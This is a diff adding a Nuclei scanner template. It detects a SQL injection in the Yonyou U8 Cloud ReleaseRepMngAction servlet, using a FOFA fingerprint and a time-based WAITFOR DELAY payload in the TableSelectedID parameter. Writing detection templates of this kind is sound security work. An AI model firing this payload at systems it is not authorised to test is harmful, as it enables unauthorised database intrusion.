@@ -1,0 +1,55 @@
+id: yongyou-u8-cloud-releaserepmngaction-sqli
+info:
+  name: 用友U8 Cloud ReleaseRepMngAction SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8cloud
+    fofa: app="用友-U8-Cloud"
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "U8C"
+
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "正在执行"
+          - "iUFO"
+      - type: dsl
+        dsl:
+          - "response_time > to_number(t1)"
+          - "response_time < to_number(t2)"
+
+    stop-at-first-match: true
+    cookie-reuse: true
+    disable-path-automerge: true
+    redirects: true
+    max-redirects: 3
